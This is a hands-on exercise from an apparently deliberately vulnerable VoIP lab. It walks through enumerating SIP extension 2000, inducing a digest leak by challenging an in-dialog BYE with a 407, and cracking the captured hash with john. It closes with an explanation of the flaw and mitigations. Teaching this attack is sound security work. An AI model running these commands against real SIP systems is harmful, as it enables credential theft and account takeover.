# Exercise 5: SIP Digest Leak

## Goal

Exploit the digest leak on extension `2000` by challenging an in-dialog `BYE`, capturing the resulting `Proxy-Authorization` digest data, and cracking it offline with `john`.

## Prerequisites

- DVRTC running: `./scripts/compose.sh --scenario pbx1 up -d`
- `sipvicious_svwar`, `digestleak`, and `john` available in the `attacker` service

## Steps

### Step 1: Open an attacker shell

Run on the host:

```bash
./scripts/compose.sh --scenario pbx1 run --rm attacker bash
cd /work
```

Use `/work` so the output files remain available in the repository's `artifacts/` directory after the container exits.

### Step 2: Confirm extension 2000 is exposed

In the attacker shell:

```bash
sipvicious_svwar -e 2000 "udp://$PUBLIC_IPV4:5060" -v
```

Verify that `svwar` identifies extension `2000`.

### Step 3: Run the digest leak attack and capture the output

In the attacker shell:

```bash
digestleak "$PUBLIC_IPV4" 2000 | tee digestleak-output.txt
```

This triggers the vulnerable `BYE` / `407 Proxy Authentication Required` flow and saves the attack output for offline analysis.
The output file is written to `artifacts/digestleak-output.txt` in the repository root.

### Step 4: Verify and crack the captured digest

In the attacker shell:

```bash
grep -E 'completed successfully|^\$sip\$' digestleak-output.txt
```

You should see the final success line and a `$sip$*...` line in `john`'s SIP format.

Extract the hash into its own file:

In the attacker shell:

```bash
grep '^\$sip\$' digestleak-output.txt > digest-hash-john.txt
```

Create a small candidate list:

In the attacker shell:

```bash
printf '1500\n1234\npassword\nadmin\n2000\n' > candidates.txt
```

Run `john` against that hash:

In the attacker shell:

```bash
john --format=SIP digest-hash-john.txt --wordlist=candidates.txt
exit
```

In this lab, the verified `john` workflow recovers the password `2000`.

## What's happening

DVRTC is intentionally vulnerable because Kamailio forwards the in-dialog `407 Proxy Authentication Required` to the registered `baresip` client on extension `2000`. The target auto-answers the call and hangs up with a `BYE`. The attacker challenges that `BYE` with a `407 Proxy Authentication Required`, and Kamailio relays the challenge to the client as part of the existing call flow.

The client cannot reliably distinguish a legitimate proxy authentication challenge from one induced by the attacker, so it retries the `BYE` with `Proxy-Authorization: Digest ...`. Kamailio then forwards that authenticated in-dialog request back to the attacker, leaking digest material that can be reused for offline password cracking.

## Mitigation

- Do not relay attacker-originated in-dialog `401` or `407` challenges to registered clients, and do not forward the resulting authenticated in-dialog requests back toward untrusted callers in a way that exposes digest material
- Alert on unexpected `407` challenges followed by authenticated `BYE` retries
